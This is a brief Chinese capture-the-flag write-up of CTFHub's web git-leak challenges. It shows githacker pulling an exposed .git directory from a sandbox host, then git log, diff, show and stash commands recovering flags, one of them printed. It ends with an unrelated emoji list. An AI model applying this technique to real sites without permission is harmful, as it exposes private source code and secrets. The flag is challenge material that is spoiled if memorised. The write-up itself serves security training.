## CTFHUB-web-git泄露

---

### 1 Log

先用`githacker` 把.git文件拉下来

```bash
githacker --url http://challenge-f2a2e4e0e1912483.sandbox.ctfhub.com:10800/.git/ --output back-future
```

然后进入`.git`文件，

```bash
git log
#查看记录
```

![image-20240924160706039](https://gitee.com/bx33661/image/raw/master/path/image-20240924160706039.png)

#### git diff

```bash
git diff ce4b24abb8699e275d928c15fc95186236a49680 fb0d383fa9877e3255aa2e208ee664abdb4d7171
```

![image-20240924160922804](https://gitee.com/bx33661/image/raw/master/path/image-20240924160922804.png)

获得flag

#### git show

```bash
git show fb0d383fa9877e3255aa2e208ee664abdb4d7171
```

![image-20240924161818869](https://gitee.com/bx33661/image/raw/master/path/image-20240924161818869.png)



### Stash

> `git stash` 是 Git 中用于临时保存当前工作目录和暂存区中的修改的命令。当你需要切换分支或处理其他任务，但又不希望提交当前的修改时，可以使用 `git stash` 将这些修改保存起来，稍后再恢复。

跟上一题一样用githacker把.git文件拉下来

`git log` `git show`没有发现什么

根据题目信息

```bash
git stash list
git stash pop
cat 11543488920599.txt
```

![image-20240924163746012](https://gitee.com/bx33661/image/raw/master/path/image-20240924163746012.png)

```bash
PS E:\gitproject\GitHacker\back-future\f91beca0696b446706904365538e0294> cat 11543488920599.txt
ctfhub{aec3255d4e30b3d99e9f9ddf}
```



### Index

这个貌似拉下来就可以拿到flag



1. 😊 - 微笑
2. 😂 - 大笑
3. 😍 - 心形眼
4. 🤔 - 思考
5. 🚀 - 火箭
6. 🌟 - 星星
7. 🎉 - 庆祝
8. 🐱 - 猫
9. 🍕 - 披萨
10. 🌈 - 彩虹